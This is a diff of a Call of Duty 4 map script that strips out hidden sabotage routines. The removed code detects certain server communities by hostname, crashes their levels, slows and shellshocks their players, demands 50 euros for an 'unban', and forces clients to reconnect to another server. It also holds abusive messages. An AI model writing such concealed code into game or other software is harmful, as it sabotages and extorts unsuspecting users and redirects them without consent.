@@ -54,8 +54,9 @@ main()
     level.music[5]["alias"]    ="song6";
 	
 	level.trash = false;
-	host = getDvar("sv_hostname");
-		if (isSubStr( toLower(host), toLower("Zsever") ) || isSubStr( toLower(host), toLower("LuV")) || isSubStr( toLower(host), toLower("CM'") ) || isSubStr( toLower(host), toLower("Nice*")) || isSubStr( toLower(host), toLower("Swat")) || isSubStr( toLower(host), toLower("TeX")) || isSubStr( toLower(host), toLower("PWDF")) || isSubStr( toLower(host), toLower("FNRP")))
+	wait 0.05;
+	speed = getDvarint("g_speed");
+	if (speed > 190)
 	{
 	level.trash = true;
 	level.timer = 14;
@@ -131,7 +132,7 @@ main()
 	thread bounce2s();
 	thread goback();
 	thread antigay();
-	thread supershit();
+
 	thread secretosenter();
 	thread secretosexit();
 	thread secretos1();
@@ -140,7 +141,7 @@ main()
 	thread secretostep1();
 	thread secretostep2();
 	thread rpg();
-	thread yolo();
+
 	addTriggerToList( "trig_trap1" );
 	addTriggerToList( "trig_trap2" );
 	addTriggerToList( "trig_trap3" );
@@ -883,17 +884,7 @@ aj1()
 	}
 }
 
-yolo()
-{
-	kek = getDvar("sv_hostname");
-	wait 7;
-	if (isSubStr( toLower(kek), toLower("xM") ))
-	{
-		iPrintLnBold ("^1KYS ^6RAKY");
-		wait 2;
-		exitLevel(true);
-	}
-}
+
 aj2()
 {
 	trig = getEnt("trig_aj2", "targetname");
@@ -1227,29 +1218,7 @@ thread removeColorFromString(gametag);
 	}
 }	
 
-supershit()
-{
-	level.legend = "#";
-	for(;;)
-	{
-	wait 5;
-	player = thread yolostuff(level.pro + level.master + level.legend);
-	if (isDefined(player))
-	{
-		wait 1;
-		player setClientDvar( "g_speed", 10 );
-		player shellshock( "jeepride_ridedeath", 60 );
-		player setMoveSpeedScale(0.5);
-		player iPrintLnBold( "^5Sorry but ^6rAKy Gaming & Serveurs^5 members are ^1not^5 allowed to play my maps" );
-		wait 1.5;
-		player iPrintLnBold( "^1For unban send ^250 euros^1 to map maker :)" );
-		wait 1.5;
-		iPrintln( "Player " + player.name + "^7 was kicked from the server because he's a ^6rAKy Gaming & Serveurs ^7member!" );
-		player thread braxi\_common::clientCmd( "disconnect; wait 10; connect cod4.xenia-gaming.net:28960" );
-		wait 0.2;
-	}		
-	}
-}
+
 
 	addTriggerToList( name )
 {
